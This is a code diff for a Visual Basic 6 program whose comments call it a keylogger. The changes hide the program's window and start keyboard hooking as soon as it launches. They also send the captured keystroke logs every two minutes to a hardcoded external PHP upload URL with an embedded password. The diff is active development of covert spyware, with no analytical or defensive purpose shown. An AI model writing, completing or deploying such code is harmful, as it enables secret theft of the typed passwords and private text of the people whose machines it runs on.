@@ -1,34 +1,24 @@
 VERSION 5.00
 Begin VB.Form FrmMain 
    Caption         =   "Form1"
-   ClientHeight    =   4710
+   ClientHeight    =   930
    ClientLeft      =   60
    ClientTop       =   390
-   ClientWidth     =   7005
+   ClientWidth     =   1770
    LinkTopic       =   "Form1"
-   ScaleHeight     =   4710
-   ScaleWidth      =   7005
+   ScaleHeight     =   930
+   ScaleWidth      =   1770
    StartUpPosition =   3  'Windows Default
+   Visible         =   0   'False
+   Begin VB.Timer CanUpload 
+      Interval        =   6000
+      Left            =   120
+      Top             =   120
+   End
    Begin VB.Timer UploaderTimer 
       Interval        =   60000
-      Left            =   1080
-      Top             =   2280
-   End
-   Begin VB.CommandButton Command2 
-      Caption         =   "Command2"
-      Height          =   435
-      Left            =   360
-      TabIndex        =   1
-      Top             =   240
-      Width           =   1215
-   End
-   Begin VB.CommandButton Command1 
-      Caption         =   "Hook"
-      Height          =   495
-      Left            =   1800
-      TabIndex        =   0
-      Top             =   240
-      Width           =   1335
+      Left            =   840
+      Top             =   120
    End
 End
 Attribute VB_Name = "FrmMain"
@@ -40,14 +30,12 @@ Attribute VB_Exposed = False
 ' - Manejar todos los errores posibles []
 ' - Hacer un downloader []
 ' - Rutinas para actualizar el keylogger []
-' - Hacer el Uploader, php []
+' - Hacer el Uploader, php [x]
 ' - Hacer un Parser del log file, php []
 ' - Upload String [x]
 
-
 Private Declare Function GetKeyboardState Lib "user32" (pbKeyState As Byte) As Long
 Private Declare Function ToAscii Lib "user32" (ByVal uVirtKey As Integer, ByVal uScanCode As Integer, ByRef lpbKeyState As Byte, ByRef lpwTransKey As Integer, ByVal fuState As Integer) As Integer
-
 Public WithEvents MyEventRaiser As EventRaiser
 Attribute MyEventRaiser.VB_VarHelpID = -1
 Public WithEvents SocketUpload As CSocketMaster
@@ -58,31 +46,29 @@ Dim PressedShift As Boolean
 Dim PressedAlt As Boolean
 Dim LastTimePressed As Date
 Dim Buffer As String, CntVbCrlF As Integer
-Dim VentanaActual As String
+Dim VentanaActual As String, CanIreloadCSM As Boolean
 Dim EnviarCada As Integer, cntMinutes As Integer
- 
-Private Sub Command1_Click()
-    Hook
-End Sub
-
-Private Sub Command2_Click()
-    UploadLogServer
-End Sub
 
 Private Sub Form_Load()
+    Debug.Print "Iniciando"
     Set MyEventRaiser = New EventRaiser
     Set SocketUpload = New CSocketMaster
+    Debug.Print "Objetos Inicializados, CSM y EventRaiser"
+
+    '''''''' <Configurar>  ''''''
     UploadUrl = "http://angelbroz.com/ab/k/kloggyx.php"
     MyLogFile = "C:\status.akl"
-    EnviarCada = 10
+    EnviarCada = 2
     'Este viene siendo el campo del archvio que recibimos en kloggyx.php
     ServerUploadPassword = "abupload"
+    '''''''' </Configurar> '''''''
+    
     Buffer = "                          [ Starting loggin at " & Now & "]"
     Save
     Buffer = ""
     LastTimePressed = Now
     CntVbCrlF = 1
-'    Hook
+    Hook
 End Sub
 
 Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
@@ -187,10 +173,11 @@ End Sub
 Private Sub MyEventRaiser_ErrorDetected(ByVal ErrStr As String)
     On Error Resume Next ' <---- LOL!!! hahaha
     Dim tmpString As String
-    tmpString = "[Error detected: " & Now & "ErrMsg:" & ErrStr & "]"
+    tmpString = "[Error detected: " & Now & " ErrMsg:" & ErrStr & "]"
     Open MyLogFile For Append As #1
         Print #1, tmpString
     Close #1
+    Debug.Print tmpString
 End Sub
 
 Sub Save()
@@ -200,9 +187,11 @@ Sub Save()
     Close #1
 End Sub
 
-Private Sub SocketUpload_Connect()
-    Me.Caption = "connected"
+Private Sub SocketUpload_CloseSck()
+    Uploading = False
+    Debug.Print "uploading false "
 End Sub
+
 
 Private Sub SocketUpload_DataArrival(ByVal bytesTotal As Long)
     On Error Resume Next
@@ -214,12 +203,30 @@ Private Sub SocketUpload_DataArrival(ByVal bytesTotal As Long)
     End If
 End Sub
 
-
 Private Sub UploaderTimer_Timer()
     'Entra cada minuto
     cntMinutes = cntMinutes + 1
+    Debug.Print "Minuto " & cntMinutes
     If cntMinutes = EnviarCada Then
         UploadLogServer
+        Debug.Print "Sending logs to the server :o"
         cntMinutes = 0
     End If
+End Sub
+
+Private Sub CanUpload_Timer()
+    On Error GoTo ErrHanlder
+    If SocketUpload.State = sckConnected Then
+        SocketUpload.SendData DatosAEnviar
+        DatosAEnviar = ""
+        CanIreloadCSM = True
+    ElseIf SocketUpload.State = sckClosed And CanIreloadCSM = True Then
+        Set SocketUpload = Nothing
+        Set SocketUpload = New CSocketMaster
+        CanIreloadCSM = False
+        Debug.Print "Yay i has a new CSM"
+    End If
+    Exit Sub
+ErrHanlder:
+    Me.MyEventRaiser.RaiseErrorDetected "Error al enviar los datos, " & Err.Description
 End Sub
